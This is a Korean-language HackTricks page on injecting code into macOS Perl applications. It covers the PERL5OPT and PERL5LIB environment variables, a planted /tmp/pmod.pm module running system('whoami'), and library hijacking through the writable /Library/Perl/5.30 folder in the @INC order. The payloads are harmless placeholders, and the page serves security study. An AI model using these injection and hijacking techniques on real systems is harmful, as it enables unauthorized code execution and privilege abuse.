# macOS Perl Applications Injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

다른 HackTricks 지원 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>

## `PERL5OPT` 및 `PERL5LIB` 환경 변수를 통한 방법

환경 변수 PERL5OPT을 사용하면 perl이 임의의 명령을 실행할 수 있습니다.\
예를 들어, 다음 스크립트를 만듭니다:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

이제 **환경 변수를 내보내고** **perl** 스크립트를 실행하세요:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
다른 옵션은 Perl 모듈을 생성하는 것입니다 (예: `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

그런 다음 환경 변수를 사용하십시오:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 의존성을 통해

Perl을 실행하는 데 필요한 종속성 폴더 순서를 나열할 수 있습니다:
```bash
perl -e 'print join("\n", @INC)'
```
다음은 비슷한 결과를 반환합니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
일부 반환된 폴더는 실제로 존재하지 않지만, **`/Library/Perl/5.30`**는 **존재**하며, **SIP로 보호되지 않았으며** SIP로 보호되는 폴더들보다 **앞에** 있습니다. 따라서 누군가는 그 폴더를 남용하여 스크립트 종속성을 추가하여 고권한 Perl 스크립트가 해당 종속성을 로드하도록 할 수 있습니다.

{% hint style="warning" %}
그러나 **해당 폴더에 쓰기 위해서는 루트 권한이 필요**하며 요즘에는 다음과 같은 **TCC 프롬프트**가 표시됩니다:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

예를 들어, 스크립트가 **`use File::Basename;`**을 가져오고 있다면 `/Library/Perl/5.30/File/Basename.pm`을 만들어 임의의 코드를 실행시킬 수 있습니다.

## 참고 자료

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
